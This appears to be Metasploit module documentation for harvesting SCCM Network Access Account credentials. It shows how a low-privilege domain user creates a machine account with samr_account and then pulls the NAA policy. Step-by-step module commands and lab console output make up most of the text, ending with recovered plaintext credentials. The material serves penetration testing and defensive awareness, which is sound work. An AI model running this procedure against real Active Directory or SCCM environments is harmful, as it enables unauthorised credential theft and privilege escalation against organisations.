## NAA Credential Exploitation

The NAA account is used by some SCCM configurations in the policy deployment process. It does not require many privileges, but 
in practice is often misconfigured to have excessive privileges.

The account can be retrieved in various ways, many requiring local administrative privileges on an existing host. However,
it can also be requested by an existing computer account, which by default most user accounts are able to create.


## Module usage
The `admin/dcerpc/samr_computer` module is generally used to first create a computer account, which requires no permissions:

1. From msfconsole
2. Do: `use auxiliary/admin/dcerpc/samr_account`
3. Set the `RHOSTS`, `SMBUser` and `SMBPass` options
   a. For the `ADD_COMPUTER` action, if you don't specify `ACCOUNT_NAME` or `ACCOUNT_PASSWORD` - one will be generated automatically
   b. For the `DELETE_ACCOUNT` action, set the `ACCOUNT_NAME` option
   c. For the `LOOKUP_ACCOUNT` action, set the `ACCOUNT_NAME` option
4. Run the module and see that a new machine account was added

Then the `auxiliary/admin/sccm/get_naa_credentials` module can be used:

1. `use auxiliary/admin/sccm/get_naa_credentials`
2. Set the `RHOST` value to a target domain controller (if LDAP autodiscovery is used)
3. Set the `USERNAME` and `PASSWORD` information to a domain account
4. Set the `COMPUTER_USER` and `COMPUTER_PASSWORD` to the values obtained through the `samr_computer` module
5. Run the module to obtain the NAA credentials, if present.

Alternatively, if the Management Point and Site Code are known, the module can be used without autodiscovery:

1. `use auxiliary/admin/sccm/get_naa_credentials`
2. Set the `COMPUTER_USER` and `COMPUTER_PASSWORD` to the values obtained through the `samr_computer` module
3. Set the `MANAGEMENT_POINT` and `SITE_CODE` to the known values.
4. Run the module to obtain the NAA credentials, if present.

The management point and site code can be retrieved using the `auxiliary/gather/ldap_query` module, using the `ENUM_SCCM_MANAGEMENT_POINTS` action.

See the Scenarios for a more detailed walk through

## Options

### RHOST, USERNAME, PASSWORD, DOMAIN, SESSION, RHOST
Options used to authenticate to the Domain Controller's LDAP service for SCCM autodiscovery.

### COMPUTER_USER, COMPUTER_PASSWORD

Credentials for a computer account (may be created with the `samr_account` module). If you've retrieved the NTLM hash of
a computer account, you can use that for COMPUTER_PASSWORD.

### MANAGEMENT_POINT
The SCCM server.

### SITE_CODE
The Site Code of the management point.

## Scenarios
In the following example the user `ssccm.lab\eve` is a low-privilege user.

### Creating computer account

```
msf6 auxiliary(admin/dcerpc/samr_account) > run rhost=192.168.33.10 domain=sccm.lab username=eve password=iloveyou
[*] Running module against 192.168.33.10

[*] 192.168.33.10:445 - Adding computer
[+] 192.168.33.10:445 - Successfully created sccm.lab\DESKTOP-2KVDWNZ3$
[+] 192.168.33.10:445 -   Password: pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj
[+] 192.168.33.10:445 -   SID:      S-1-5-21-3875312677-2561575051-1173664991-1128
[*] Auxiliary module execution completed
```

### Running with Autodiscovery
Using the credentials just obtained with the `samr_account` module.

```
msf6 auxiliary(admin/sccm/get_naa_credentials) > options

Module options (auxiliary/admin/sccm/get_naa_credentials):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   COMPUTER_PASS                      yes       The password of the provided computer account
   COMPUTER_USER                      yes       The username of a computer account
   MANAGEMENT_POINT                   no        The management point (SCCM server) to use
   SITE_CODE                          no        The site code to use on the management point
   SSL               false            no        Enable SSL on the LDAP connection
   VHOST                              no        HTTP server virtual host


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DOMAIN                     no        The domain to authenticate to
   PASSWORD                   no        The password to authenticate with
   RHOSTS                     no        The domain controller (for autodiscovery). Not required if providing a management point and site code
   RPORT     389              no        The LDAP port of the domain controller (for autodiscovery). Not required if providing a management point and site code (TCP)
   USERNAME                   no        The username to authenticate with


View the full module info with the info, or info -d command.
msf6 auxiliary(admin/sccm/get_naa_credentials) > run rhost=192.168.33.10 username=eve domain=sccm.lab password=iloveyou computer_user=DESKTOP-2KVDWNZ3$ computer_pass=pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj
[*] Running module against 192.168.33.10

[*] Discovering base DN automatically
[*] 192.168.33.10:389 Discovered base DN: DC=sccm,DC=lab
[+] Found Management Point: MECM.sccm.lab (Site code: P01)
[*] Got SMS ID: BD0DC478-A71A-4348-BD14-B7E91335738E
[*] Waiting 5 seconds for SCCM DB to update...
[*] Got NAA Policy URL: http://<mp>/SMS_MP/.sms_pol?{c48754cc-090c-4c56-ba3d-532b5ce5e8a5}.2_00
[+] Found valid NAA credentials: sccm.lab\sccm-naa:123456789
[*] Auxiliary module execution completed
```

### Manual discovery

```
msf6 auxiliary(gather/ldap_query) > run rhost=192.168.33.10 username=eve domain=sccm.lab password=iloveyou
[*] Running module against 192.168.33.10

[*] 192.168.33.10:389 Discovered base DN: DC=sccm,DC=lab
CN=SMS-MP-P01-MECM.SCCM.LAB,CN=System Management,CN=System,DC=sccm,DC=lab
=========================================================================

 Name           Attributes
 ----           ----------
 cn             SMS-MP-P01-MECM.SCCM.LAB
 dnshostname    MECM.sccm.lab
 mssmssitecode  P01

[*] Query returned 1 result.
[*] Auxiliary module execution completed

msf6 auxiliary(gather/ldap_query) > use auxiliary/admin/sccm/get_naa_credentials

msf6 auxiliary(admin/sccm/get_naa_credentials) > run computer_user=DESKTOP-2KVDWNZ3$ computer_pass=pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj management_point=MECM.sccm.lab site_code=P01

[*] Got SMS ID: BD0DC478-A71A-4348-BD14-B7E91335738E
[*] Waiting 5 seconds for SCCM DB to update...
[*] Got NAA Policy URL: http://<mp>/SMS_MP/.sms_pol?{c48754cc-090c-4c56-ba3d-532b5ce5e8a5}.2_00
[+] Found valid NAA credentials: sccm.lab\sccm-naa:123456789
[*] Auxiliary module execution completed
```